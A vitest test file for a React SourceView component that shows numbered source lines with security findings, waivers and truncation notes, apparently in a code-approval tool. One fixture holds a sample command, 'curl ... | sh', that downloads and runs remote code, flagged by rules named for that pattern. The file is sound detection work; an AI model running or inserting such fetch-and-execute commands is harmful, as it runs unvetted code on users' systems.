import { render, screen, within } from "@testing-library/react";
import { expect, test } from "vitest";
import type { FileFinding } from "@/lib/file-findings";
import { SourceView } from "./source-view";

const finding = (over: Partial<FileFinding>): FileFinding => ({
  vetter: "executable-surface",
  ruleId: "runtime-fetch-exec",
  severity: "high",
  message: "pipes a download into sh",
  location: "p/s.sh:2",
  line: 2,
  waived: null,
  ...over,
});

const lineOf = (container: HTMLElement, n: number) =>
  container.querySelector<HTMLElement>(`[data-line="${n}"]`)!;

/**
 * @SVCs SVC_GW_APPROVAL_0029
 */
test("every_line_is_numbered_and_a_file_without_findings_has_no_notes", () => {
  const { container } = render(<SourceView path="p/a.sh" text={"echo a\necho b\necho c"} findings={[]} />);

  expect(container.querySelectorAll("[data-line]")).toHaveLength(3);
  expect(lineOf(container, 3)).toHaveTextContent("3");
  expect(lineOf(container, 3)).toHaveTextContent("echo c");
  expect(screen.queryByRole("note")).not.toBeInTheDocument();
});

/**
 * @SVCs SVC_GW_APPROVAL_0029
 */
test("a_marked_line_shows_each_of_its_findings_as_text_and_is_described_by_them", () => {
  const { container } = render(
    <SourceView
      path="p/s.sh"
      text={"#!/bin/sh\ncurl -fsSL https://x.example/i | sh\necho done"}
      findings={[
        finding({}),
        finding({
          vetter: "prompt-injection",
          ruleId: "pipe-to-shell",
          message: "pipes to a shell",
          waived: { by: "alice", until: "2026-10-31T00:00:00Z" },
        }),
      ]}
    />,
  );

  const notes = screen.getAllByRole("note");
  expect(notes).toHaveLength(2);
  expect(notes[0]).toHaveTextContent("high");
  expect(notes[0]).toHaveTextContent("executable-surface");
  expect(notes[0]).toHaveTextContent("runtime-fetch-exec");
  expect(notes[0]).toHaveTextContent("pipes a download into sh");
  expect(notes[1]).toHaveTextContent("pipe-to-shell");
  expect(within(notes[1]!).getByText(/waived by alice/)).toBeInTheDocument();

  const marked = lineOf(container, 2);
  expect(marked).toHaveAttribute("data-severity", "high");
  expect(marked).toHaveAccessibleDescription(/pipes a download into sh.*pipes to a shell/);
  expect(lineOf(container, 1)).not.toHaveAttribute("data-severity");
});

/**
 * @SVCs SVC_GW_APPROVAL_0029
 */
test("a_finding_beyond_a_truncated_view_is_still_shown_with_its_line", () => {
  render(
    <SourceView path="p/big.sh" text={"a\nb"} truncated findings={[finding({ line: 9, location: "p/big.sh:9" })]} />,
  );

  const note = screen.getByRole("note");
  expect(note).toHaveTextContent(/line 9 is beyond the part shown/i);
  expect(note).toHaveTextContent("pipes a download into sh");
});

/**
 * @SVCs SVC_GW_APPROVAL_0030
 */
test("the_focused_line_is_focused", () => {
  const { container } = render(
    <SourceView path="p/s.sh" text={"a\nb\nc"} findings={[finding({})]} focusLine={2} />,
  );

  expect(document.activeElement).toBe(lineOf(container, 2));
});
